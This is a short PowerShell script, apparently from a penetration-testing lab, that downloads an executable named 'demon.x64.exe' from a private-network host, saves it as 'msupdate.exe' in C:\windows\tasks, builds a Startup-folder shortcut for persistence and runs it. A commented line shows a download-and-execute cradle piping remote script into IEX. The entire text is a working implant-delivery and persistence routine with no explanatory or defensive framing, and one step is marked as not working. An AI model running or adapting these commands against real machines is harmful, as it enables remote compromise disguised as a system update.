# (new-object net.webclient).downloadString("http://192.168.45.156/installer.ps1") | IEX
wget 'http://192.168.45.196/demon.x64.exe' -o c:\windows\tasks\msupdate.exe
# Need to fix this part since it is not working perfectly
$Shell = New-Object -ComObject ("WScript.Shell")
$ShortCut = $Shell.CreateShortcut([Environment]::GetFolderPath([Environment+SpecialFolder]::CommonStartup) + "\common.lnk")
$ShortCut.TargetPath="C:\windows\tasks\msupdate.exe"
$ShortCut.WorkingDirectory = "C:\";
# Running...
c:\windows\tasks\msupdate.exe
